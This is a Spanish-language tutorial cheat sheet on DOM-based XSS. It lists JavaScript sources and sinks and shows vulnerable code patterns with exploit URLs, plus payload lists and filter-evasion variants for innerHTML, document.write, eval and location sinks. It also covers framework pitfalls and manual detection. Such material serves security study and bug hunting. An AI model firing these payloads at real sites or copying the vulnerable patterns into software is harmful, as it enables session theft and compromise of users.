# DOM-Based XSS

El payload nunca llega al servidor. La vulnerabilidad está en el JavaScript del lado del cliente: el código JS lee datos de una fuente controlable (URL, localStorage...) y los escribe en el DOM de forma insegura.

```
URL con payload → JS del navegador lee la URL → 
JS escribe el payload en el DOM sin sanitizar → Script ejecutado
```

La diferencia clave es que en el servidor **nunca se ve el payload** — todo ocurre en el navegador.

### Sources y Sinks

#### Sources (fuentes — donde entra el dato controlable)

```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
window.location
window.location.href
window.location.search      // query string: ?param=valor
window.location.hash        // fragmento: #valor
window.location.pathname
document.referrer
window.name
history.pushState()
localStorage / sessionStorage
document.cookie
WebSocket data
postMessage data
XMLHttpRequest response
fetch() response
```

#### Sinks (destinos inseguros — donde se escribe el dato)

```javascript
// Ejecución directa de JS
eval()
setTimeout("string", ...)
setInterval("string", ...)
new Function("string")
document.write()
document.writeln()

// Modificación del DOM con HTML
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
element.insertAdjacentElement()

// Navegación
window.location = "..."
window.location.href = "..."
window.location.replace()
document.location = "..."

// Carga de recursos
element.src = "..."
element.action = "..."
element.formaction = "..."
$.ajax({ url: "..." })   // jQuery

// jQuery sinks
$()
$().html()
$().append()
$().prepend()
$().after()
$().before()
$().replaceWith()
$().attr('href', ...)
```

### Patrones de código vulnerables

#### Patrón 1 — hash en innerHTML

```javascript
// Código vulnerable
document.getElementById('content').innerHTML = location.hash.slice(1);

// URL de explotación
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page#<svg onload=alert(1)>
```

#### Patrón 2 — query param en document.write

```javascript
// Código vulnerable
var search = new URLSearchParams(window.location.search).get('q');
document.write('<p>Resultado: ' + search + '</p>');

// URL de explotación
https://target.com/search?q=<script>alert(1)</script>
https://target.com/search?q=</p><img src=x onerror=alert(1)>
```

#### Patrón 3 — eval de parámetro

```javascript
// Código vulnerable
var callback = location.search.match(/callback=([^&]+)/)[1];
eval(callback + '()');

// URL de explotación
https://target.com/api?callback=alert(1);//
https://target.com/api?callback=alert`1`
```

#### Patrón 4 — location.href con hash

```javascript
// Código vulnerable
var tab = location.hash.slice(1);
document.querySelector('#' + tab).style.display = 'block';

// Si el resultado se refleja en innerHTML:
https://target.com/page#x><img src=x onerror=alert(1)>
```

#### Patrón 5 — jQuery attr/html

```javascript
// Código vulnerable
var name = decodeURIComponent(location.search.slice(1));
$('#welcome').html('Bienvenido ' + name);

// URL de explotación
https://target.com/page?<img src=x onerror=alert(1)>

// Código vulnerable con attr
var link = location.hash.slice(1);
$('a#nav').attr('href', link);

// URL de explotación
https://target.com/page#javascript:alert(1)
```

#### Patrón 6 — window.name

```javascript
// Código vulnerable (window.name persiste entre navegaciones)
document.getElementById('msg').innerHTML = window.name;

// Explotación: abrir target desde página controlada
<script>
  window.open('https://target.com/vulnerable', 'target_name');
  // El window.name del popup se establece como: <img src=x onerror=alert(1)>
  // Requiere que el atacante controle la página que abre el target
</script>
```

#### Patrón 7 — postMessage

```javascript
// Código vulnerable
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
});

// Explotación desde iframe o ventana abierta
<script>
  var win = window.open('https://target.com/page');
  setTimeout(function() {
    win.postMessage('<img src=x onerror=alert(1)>', '*');
  }, 2000);
</script>
```

### Payloads específicos para DOM XSS

#### Para innerHTML / outerHTML

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<video src=1 onerror=alert(1)>
<math><mtext></table><img src=x onerror=alert(1)>
```

#### Para document.write / document.writeln

```html
<script>alert(1)</script>
</script><script>alert(1)</script>
"><script>alert(1)</script>
```

#### Para eval / setTimeout / setInterval con string

```javascript
alert(1)
alert(1)//
1;alert(1)
-alert(1)-
\u0061lert(1)        // Unicode bypass
```

#### Para location.href / window.location

```javascript
javascript:alert(1)
JaVaScRiPt:alert(1)
javascript:%61lert(1)
javascript:void(alert(1))
```

### Cómo detectar DOM XSS manualmente

```
1. Revisar el source JS de la página (DevTools → Sources)

2. Buscar sources en el código:
   → location.hash, location.search, location.href
   → document.URL, document.referrer
   → window.name, localStorage

3. Buscar sinks en el código:
   → innerHTML, eval, document.write, $.html()

4. Trazar el flujo: ¿llega el dato del source al sink?

5. Probar con un valor único:
   → https://target.com/#xsstest123
   → Buscar "xsstest123" en el DOM (DevTools → Console):
      document.body.innerHTML.includes('xsstest123')

6. Si aparece en un sink peligroso, inyectar payload adaptado
```

### DOM XSS en frameworks modernos

#### React

```javascript
// Vulnerable — dangerouslySetInnerHTML
function Component({ userInput }) {
  return <div dangerouslySetInnerHTML={{__html: userInput}} />;
}

// Vulnerable — href con input no sanitizado
function Link({ url }) {
  return <a href={url}>Click</a>;  // javascript:alert(1) si url no se valida
}
```

#### Angular

```javascript
// Vulnerable — bypassSecurityTrustHtml
constructor(private sanitizer: DomSanitizer) {}
this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);

// Vulnerable — innerHTML binding sin sanitizar
<div [innerHTML]="userInput"></div>
```

#### Vue.js

```javascript
// Vulnerable — v-html
<div v-html="userInput"></div>

// Vulnerable — template literal con input
new Vue({ template: '<div>' + userInput + '</div>' });
```

### DOM XSS con fragmento&#x20;

El fragmento (#) nunca se envía al servidor, perfecto para DOM XSS ya que no aparece en logs del servidor.

```
https://target.com/page#<img src=x onerror=alert(1)>

→ El servidor ve: GET /page HTTP/1.1
→ El navegador procesa: location.hash = "#<img src=x onerror=alert(1)>"
→ Si JS usa location.hash en un sink peligroso → XSS sin rastro en logs
```

> DOM XSS es especialmente difícil de detectar con scanners automáticos porque la vulnerabilidad está en el JS del cliente, no en la respuesta del servidor.

> En Bug Bounty, DOM XSS via `location.hash` es muy valorado porque no deja rastro en los logs del servidor y no puede ser bloqueado por WAF tradicionales.

> Herramientas como **DOM Invader** de Burp Suite facilitan enormemente la detección de sources y sinks en aplicaciones modernas con mucho JS.
